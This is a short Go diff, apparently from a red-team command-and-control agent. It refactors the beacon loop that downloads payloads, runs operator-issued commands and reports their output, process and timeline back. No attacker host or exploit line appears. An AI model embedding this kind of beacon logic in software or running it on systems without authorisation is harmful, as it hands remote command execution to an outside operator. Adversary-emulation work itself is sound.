@@ -26,14 +26,14 @@ func runLinks(tempB *util.Beacon, beacon *util.Beacon, agent *util.AgentConfig, 
 		jitterSleep(agent.CommandJitter, "JITTER")
 		var payloadPath string
 		var payloadErr error
-		if len(link.Payload) > 0 {
-			payloadPath, payloadErr = requestPayload(link.Payload)
+		if len(link.Request.Payload) > 0 {
+			payloadPath, payloadErr = requestPayload(link.Request.Payload)
 		}
 		if payloadErr == nil {
-			response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
-			link.Response = strings.TrimSpace(response) + delimiter
-			link.Status = status
-			link.Pid = pid
+			response, process, timeline := commands.RunCommand(link.Request.Command, link.Executor, payloadPath, agent)
+			link.Response = response
+			link.Process = process
+			link.Timeline = timeline
 		} else {
 			payloadErrorResponse(payloadErr, agent, &link)
 		}
@@ -76,9 +76,10 @@ func requestPayload(target string) (string, error) {
 }
 
 func payloadErrorResponse(err error, agent *util.AgentConfig, link *util.Instruction) {
-	link.Response = "Payload Error: " + strings.TrimSpace(err.Error())
-	link.Status = 1
-	link.Pid = agent.Pid
+	response, process, timeline := util.BuildErrorResponse("Payload Error: " + strings.TrimSpace(err.Error()))
+	link.Response = response
+	link.Process = process
+	link.Timeline = timeline
 }
 
 func jitterSleep(sleep int, beaconType string) {
